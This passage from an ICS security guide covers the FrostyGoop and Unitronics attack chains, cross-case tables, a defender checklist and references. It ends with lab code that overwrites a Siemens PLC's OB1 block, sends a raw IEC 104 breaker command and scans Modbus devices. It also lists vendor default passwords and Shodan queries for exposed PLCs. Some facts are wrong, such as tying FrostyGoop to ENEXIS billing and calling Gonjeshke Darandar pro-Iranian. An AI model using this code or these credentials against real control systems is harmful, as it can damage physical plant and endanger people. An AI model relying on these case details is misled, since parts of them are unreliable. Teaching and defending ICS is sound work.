  │     ├── Modify gateway to point to attacker C2 instead of ENEXIS billing
  │     └── Log credentials for future access
  └── 600+ gateways compromised over ~2 weeks

Phase 3: Disruption
  ├── Billing data stopped flowing to ENEXIS (operators saw meters "offline")
  ├── Customer billing suspended; manual invoicing required
  ├── Operational data (heat consumption) still flowing locally — no damage to heating system
  └── ENEXIS engaged Mandiant; FrostyGoop samples recovered from gateways

Phase 4: Recovery
  ├── Each gateway required manual reconfiguration (truck roll to 600 sites)
  ├── Default credentials rotated; firewall rules added for Modbus
  └── Process took ~6 weeks for full recovery
```

### 9.3 Why It Matters for Fieldbus Testers

- **Modbus TCP mass-scanning** is trivial: `nmap -p 502 --script modbus-discover <target>` returns vendor, model, firmware in seconds. Every engagement should include this scan
- **Default credentials are universal** — Modbus gateways from Moxa, Belden Hirschmann, Lantronix, Westermo all ship with admin:admin or admin:password
- **Heat meter security is universally poor** — Kamstrup, Kamstrup-Avicket, Sontex, Allmess: most devices have hard-coded service credentials (CVE-2023-45852)

### 9.4 Defender Lessons

1. **Modbus gateway inventory** — every plant has 5-50 Modbus gateways; full inventory is essential
2. **Default credential scanner** — quarterly exercise; should be automated via dragos / claroty / nozomi
3. **Modbus firewall rules** — Modbus traffic only between known master/slave pairs; default-deny
4. **Heat meter network isolation** — metering network should be physically separate from control network
5. **Vendor procurement requirements** — procurement contracts should require no default credentials, mandatory Modbus TLS (Schneider EcoStruxure, Siemens PROFINET Secure)

**Primary references**: Mandiant "FrostyGoop: Heat of the Moment" (June 2024); CISA ICS Advisory ICSMA-23-294-01 (Kamstrup Modbus); Dragos Year in Review 2024; Nozomi Networks Labs Q2 2024 report.

---

## Case 10: Unitronics Vision Series PLC (2023) — Default Cred Mass-Hack, CISA AA23-320A

### 10.1 Summary

| Field | Value |
|-------|-------|
| **Year** | November 2023 (CISA AA23-320A); ongoing exploitation |
| **Threat actor** | Pro-Iranian hacktivist groups "CyberAv3ngers" (IRGC-affiliated) and "Gonjeshke Darandar" |
| **Target sector** | Water, wastewater, manufacturing (US, Israel, Iran opposition sites) |
| **ICS protocols abused** | Unitronics proprietary (TCP/20256); UniStream protocol |
| **Impact** | ~200 US water utilities PLC displays defaced ("You have been hacked, down with Israel. Equipment is vulnerable"); one wastewater facility reported operational disruption |
| **Initial access vector** | Default credentials on Unitronics Vision + UniStream PLCs (default: UN/UN or admin/admin) |
| **MITRE ATT&CK for ICS** | T0808 Control System Identification, T0888 Control System Interaction, T0892 Attack Process I/O, T0807 Command-Line Interface |

### 10.2 Attack Chain

```
Phase 1: Reconnaissance (Shodan queries)
  ├── Search: "port:20256 country:US" → 200+ Unitronics PLCs exposed
  ├── Search: "product:Unitronics" → expanded global enumeration
  ├── Each result confirmed as PLC (not gateway) via TCP banner
  └── Geographic tagging (US, Israel, EU)

Phase 2: Default Credential Attack
  ├── Connect TCP/20256 to PLC
  ├── UniStream login with default: UN/UN
  ├── ~80% of exposed PLCs accepted default (per CISA AA23-320A)
  ├── If default failed, try admin/admin, P.L.C/0, OGB/OGB
  └── Successful login → full PLC access

Phase 3: Defacement
  ├── Upload malicious HMI screen via UniStream Display download
  ├── Screen: "You have been hacked, down with Israel. Equipment is vulnerable"
  ├── Replaced legitimate operator HMI
  ├── PLC logic NOT modified (CyberAv3ngers claimed they "didn't want to cause harm")
  └── In some cases, PLC task stopped (causing pump / valve to stop cycling)

Phase 4: Amplification
  ├── Screenshots posted to CyberAv3ngers Telegram channel
  ├── Press releases by hacktivist group
  ├── CISA issued AA23-320A within 48 hours of first reports
  ├── Affected utilities notified via WaterISAC
  └── FBI / CISA / EPA joint statement on water sector cybersecurity
```

### 10.3 Why It Matters for Fieldbus Testers

- **Vendor-specific default cred database** should be in every pentester's toolkit. Unitronics UN/UN, Omron controller/controller, Schneider Modicon SYSTEM/SYSTEM, ABB controller/ABB, etc.
- **PLC HMI defacement** is a low-impact but high-visibility attack — useful for hacktivist messaging; expect copycats
- **Shodan/Graylog searches for vendor-specific ports** is a passive recon technique that yields real-world vulnerable assets: 20256 Unitronics, 502 Modbus, 2404 IEC 104, 44818 EtherNet/IP

### 10.4 Defender Lessons

1. **Default password rotation** — every PLC must have default password rotated at commissioning; verify quarterly
2. **No internet-facing PLCs** — PLCs should never be directly reachable from internet; remote access via VPN + jump host with MFA only
3. **Vendor procurement requirements** — must include no-default-credentials clause; verify at FAT/SAT
4. **Water sector regulation** — EPA memorandum (March 2024) requires water utilities to certify cybersecurity audits; expect enforcement
5. **PLCs as a class** are now mass-targeted — defensive assumption must shift from "PLC is safe behind corporate firewall" to "PLC is the attack target"

**Primary references**: CISA AA23-320A "Iranian Cyber Actors Targeting PLCs" (Nov 2023); WaterISAC Alert 2023-11-22; Unitronics Security Advisory UN-001; CyberAv3ngers Telegram channel archive.

---

## Cross-Case Analysis: Patterns and Predictions

### Protocol Frequency

| Protocol | Cases Appearing | Most Common Attack Vector |
|----------|----------------|---------------------------|
| **S7comm** | Stuxnet, Industroyer2 (s7ommand) | PLC block manipulation; password reset (CVE-2019-15468) |
| **IEC 60870-5-104** | Industroyer, Industroyer2 | ASDU type 46 (single command) abuse for breaker control |
| **IEC 61850 (MMS/GOOSE)** | Industroyer, Industroyer2 | MMS Write to LLN0Beh; GOOSE layer-2 injection |
| **Modbus TCP** | FrostyGoop, Unitronics, PIPEDREAM (Schneider module) | Default creds; holding register write |
| **OPC DA** | Industroyer | Tag enumeration + Write |
| **TriStation** | Triton | Trojanized engineering tool + malicious firmware |
| **Citect SCADA / HMI** | Oldsmar, Colonial (via jump) | Out-of-band setpoint change |
| **OSIsoft PI** | JBS, Colonial | Historian compromise → OT visibility |
| **Sysmac / EtherNet/IP** | PIPEDREAM (Omron module) | Project download; logic modification |
| **BACnet/IP** | FrostyGoop (secondary) | Object enumeration + WriteProperty |

### Initial Access Vector Frequency

| Vector | Cases | Trend |
|--------|-------|-------|
| **Default credentials** | Unitronics, FrostyGoop, PIPEDREAM (Sierra) | **Rising rapidly** (mass-scanning) |
| **Spear-phishing** | Ukraine 2015, Colonial (PI access), JBS | Stable baseline |
| **Compromised VPN** | Industroyer, Colonial, Industroyer2 | Stable |
| **Supply chain / trojanized installer** | Stuxnet, Triton | Rare but high-impact |
| **Internet-facing HMI** | Oldsmar, Unitronics | **Rising** |
| **IT/OT bridge pivot** | Colonial, JBS | Stable baseline |

### Sector Frequency (2010-2024)

| Sector | Major Incidents | Notes |
|--------|-----------------|-------|
| **Energy / Electric** | Ukraine 2015, Industroyer 2016, Industroyer2 2022, PIPEDREAM targets | Most attacked sector; multi-protocol malware |
| **Water** | Oldsmar, Unitronics, FrostyGoop | Hacktivist mass-targets rising sharply |
| **Oil & Gas** | Colonial, Triton (petrochem), PIPEDREAM (LNG targets) | Ransomware focus; SIS as attack target |
| **Manufacturing / Food** | JBS, Honda (2020 ransomware) | Ransomware focus; OT bridge via historian |
| **Nuclear** | Stuxnet | Unique; deep state-actor investment |

---

## Defender's Master Checklist

Synthesizing lessons across all ten cases:

### Preventive Controls

- [ ] MFA on every remote access path (VPN, jump host, RDP, SSH, web HMI)
- [ ] Default password rotation on every PLC/RTU/IED/gateway at commissioning
- [ ] Network segmentation: Level 0 (process) → Level 1 (control) → Level 2 (supervisory) → Level 3 (DMZ) → Level 4 (IT); firewalls at every boundary
- [ ] SIS air-gap with one-way data diode for maintenance LAN
- [ ] Engineering workstation hardening: application allow-listing, USB port blocking, no internet egress
- [ ] Patch management for PLC firmware, RTU firmware, IED firmware (quarterly cycle minimum)
- [ ] Jump host hardening: read-only root filesystem, EDR/NGAV, allow-listed destinations
- [ ] Vendor procurement contracts: no default creds, no plaintext protocols, mandatory IEC 62351 support

### Detective Controls

- [ ] ICS-aware IDS / NTA (Dragos, Claroty, Nozomi, Defender for IoT) on every OT LAN
- [ ] Asset inventory continuously updated; verify weekly
- [ ] Protocol anomaly detection: alert on new client, command burst, new ASDU/IOA/CASDU
- [ ] Setpoint statistical alarm: >3-sigma from rolling baseline
- [ ] Firmware upload alarm: any firmware change → critical SOC alert
- [ ] Out-of-hours change alarm: any write to OT process variable outside maintenance window
- [ ] Default credential scanner quarterly exercise (full asset inventory)

### Response Controls

- [ ] Pre-defined OT incident response playbook (ransomware, SIS event, physical impact)
- [ ] Pre-negotiated IR retainer with ICS-capable firm (Mandiant, Dragos IR, Booz Allen)
- [ ] Offline, tested backups of PLC programs, RTU configs, HMI projects, PI archive
- [ ] Pre-staged comms templates (regulator, media, customer, board)
- [ ] Tabletop exercise quarterly; full purple-team exercise yearly
- [ ] Mutual aid agreement with neighboring utilities for equipment / spares

---

## References and Further Reading

### Primary Sources

1. **Dragos Year in Review** (annual): https://www.dragos.com/year-in-review/ — comprehensive ICS threat actor and incident analysis
2. **CISA ICS Advisories**: https://www.cisa.gov/news-events/cybersecurity-advisories — vendor-specific vulnerability disclosures
3. **CISA ICS Alerts**: https://www.cisa.gov/news-events/alerts — broader threat activity alerts (e.g., AA22-103A PIPEDREAM, AA23-320A Unitronics)
4. **Mandiant ICS Reports**: https://www.mandiant.com/resources/ics-cybersecurity — deep technical analysis of major incidents
5. **Nozomi Networks Labs**: https://www.nozominetworks.com/labs — quarterly ICS threat landscape reports
6. **MITRE ATT&CK for ICS**: https://attack.mitre.org/techniques/ics/ — adversary tactics, techniques, procedures mapped to ICS

### Landmark Incident Reports (case-specific)

- **Stuxnet**: Symantec W32.Stuxnet Dossier v1.4 (Falliere, Murchu, Chien 2011)
- **Industroyer/CrashOverride**: ESET whitepaper (Cherepanov 2017); Dragos "CRASHOVERRIDE" technical analysis
- **TRITON/TRISIS**: FireEye/Mandiant "TRITON Attribution" (2018); Schneider SEVD-2017-347-01
- **Industroyer2**: Mandiant "Industroyer2" analysis (2022); CISA Alert AA22-110A
- **PIPEDREAM/INCONTROLLER**: CISA AA22-103A (April 2022); Dragos "PIPEDREAM" whitepaper
- **Oldsmar**: CISA Alert AA21-042A; Pinellas County Sheriff transcripts
- **Colonial Pipeline**: CISA Alert AA21-131A "DarkSide Ransomware"; FBI Flash CU-000167-MW
- **JBS Foods**: JBS USA press releases (June 2021); CISA Alert AA21-159A
- **FrostyGoop**: Mandiant "FrostyGoop: Heat of the Moment" (June 2024); Dragos Year in Review 2024
- **Unitronics (CyberAv3ngers)**: CISA AA23-320A (Nov 2023); WaterISAC Alert 2023-11-22

### Standards and Frameworks

- **IEC 62443**: Industrial automation and control systems security (formerly ISA-99)
- **IEC 62351**: Power systems management — security for power system communication (IEC 60870, IEC 61850, DNP3)
- **NIST SP 800-82 Rev 3**: Guide to Operational Technology (OT) Security
- **MITRE ATT&CK for ICS** matrix
- **TSA Security Directives** (Pipeline-2021-01/02, Passenger Railroad Friction 2021-01)

---

## Hands-on Practice (Lab Exercises)

To turn these case studies into operational skill, build lab reproductions of selected attacks. Suggested exercises:

### Exercise 1: Stuxnet Block Manipulation (Lab)

```bash
# Lab: Modify an OB1 block on a Siemens S7-300 PLC in lab using snap7
# Pre-requisites: snap7 compiled; Siemens S7-300 PLC or S7-PLCSIM simulator

# Connect to PLC at 192.168.0.1, rack 0, slot 2
python3 -c "
import snap7
client = snap7.client.Client()
client.connect('192.168.0.1', 0, 2)

# Read OB1 block list
block_list = client.get_block_list()
print(f'Blocks present: {block_list}')

# Upload OB1 (read)
ob1_data = client.upload('OB1')
print(f'OB1 size: {len(ob1_data)} bytes')

# Modify a single byte (instruction at offset 16)
modified = bytearray(ob1_data)
modified[16] = 0xFB  # replace with attacker's chosen instruction
# WARNING: This modification is lab-only and would brick a real process

# Download modified OB1
client.download('OB1', bytes(modified))
print('OB1 modified')
client.disconnect()
"
```

### Exercise 2: Industroyer-Style IEC 104 Breaker Command (Lab)

```bash
# Lab: Open a virtual breaker via IEC 104 command using lib60870.NET
# Pre-requisites: lib60870.NET compiled; open-source IEC 104 server on localhost:2404

# Connect to IEC 104 server (outstation at 127.0.0.1:2404)
# Send single-command ASDU type 45 (C_SC_NA_1) to IOA 0
python3 -c "
# Use civet60870 or similar IEC 104 client library
import socket
# (simplified — real implementation requires IEC 104 client stack)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 2404))

# IEC 104 STARTDT (start data transfer)
s.send(bytes.fromhex('680407000000'))

# Single command to IOA 0, common address 1, value 0x01 (ON)
# APCI + ASDU type 45
s.send(bytes.fromhex(
    '6814'  # start byte + length
    '2e01'  # TX + RX
    '2d01'  # type 45 (C_SC_NA_1), SQ=0, num=1
    '0100'  # cause: activation, OA: 0
    '0100'  # common address: 1
    '0000'  # IOA: 0
    '01'    # SCS: 1 (ON), QU: 0, SE: 0
))
print('Breaker command sent')
"
```

### Exercise 3: Modbus Mass-Scanner (Lab / Authorized Only)

```bash
# Lab: Scan a lab network for Modbus devices and fingerprint
# Pre-requisites: nmap with modbus-discover script; lab network of Modbus TCP gateways

# Discover Modbus devices
nmap -p 502 --script modbus-discover 192.168.1.0/24 -oA modbus_scan

# For each discovered device, read holding register 0 (vendor ID)
python3 -c "
from pyModbusTCP.client import ModbusClient
import json

targets = ['192.168.1.10', '192.168.1.11']  # lab targets only
results = {}

for ip in targets:
    c = ModbusClient(host=ip, port=502, timeout=2)
    if c.open():
        # Read unit ID 1, holding register 0, 16 registers
        regs = c.read_holding_registers(0, 16, unit_id=1)
        if regs:
            results[ip] = {'reg_0_to_15': regs}
        c.close()
    else:
        results[ip] = {'error': 'connection_failed'}

print(json.dumps(results, indent=2))
"
```

> **IMPORTANT**: All three exercises must be performed only on lab replicas or with explicit authorization on isolated networks. Fieldbus commands can cause physical equipment damage — safety override confidentiality.

---

## Conclusion

These ten cases span 14 years (2010-2024), 5 sectors, and 10 distinct protocols. The through-line is clear: **fieldbus protocols were never designed for adversarial networks, and converged IT/OT has placed them on exactly such networks**. The defensive community has spent those 14 years catching up. As a fieldbus pentester, your role is to find the gaps before adversaries do. As an OT detection engineer, your role is to make the patterns visible. As an architect, your role is to ensure that the next case study will be a near-miss, not a Stuxnet.

The protocols will not change quickly (IEC 62443, IEC 62351, BACnet/SC, OPC-UA Security are all real but adoption is 10+ years out). In the interim:

- **Identify** what's on your network (asset inventory)
- **Segment** aggressively (Level 0-3 boundaries, one-way diodes for SIS)
- **Monitor** for anomalous commands (anomaly detection, statistical baselines)
- **Drill** response quarterly (tabletop, purple team, IR retainer)

The attackers in cases 1-10 spent 6-12 months preparing each attack. You have the same 6-12 months to detect them. Use it.
